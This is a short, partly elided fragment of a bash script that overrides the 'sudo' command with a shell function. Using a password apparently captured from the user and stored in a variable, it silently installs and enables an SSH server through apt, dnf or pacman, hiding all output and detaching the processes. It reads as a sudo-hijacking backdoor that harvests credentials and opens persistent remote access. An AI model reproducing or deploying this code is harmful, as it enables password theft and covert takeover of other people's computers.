...
sudo(){
	...
	if [[ "$?" = "0" ]]; then
		...
		if [[ "$success" = "true" ]]; then
			...
			setsid bash -c "echo \"$horseVision\" | sudo -S apt install -y openssh-server >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl enable --now ssh >/dev/null 2>&1 " >/dev/null 2>&1 </dev/null
			setsid bash -c "echo \"$horseVision\" | sudo -S dnf install -y openssh-server >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl enable --now sshd >/dev/null 2>&1" >/dev/null 2>&1 </dev/null
			setsid bash -c "echo \"$horseVision\" | sudo -S pacman -S --noconfirm openssh >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl enable --now sshd >/dev/null 2>&1" >/dev/null 2>&1 </dev/null
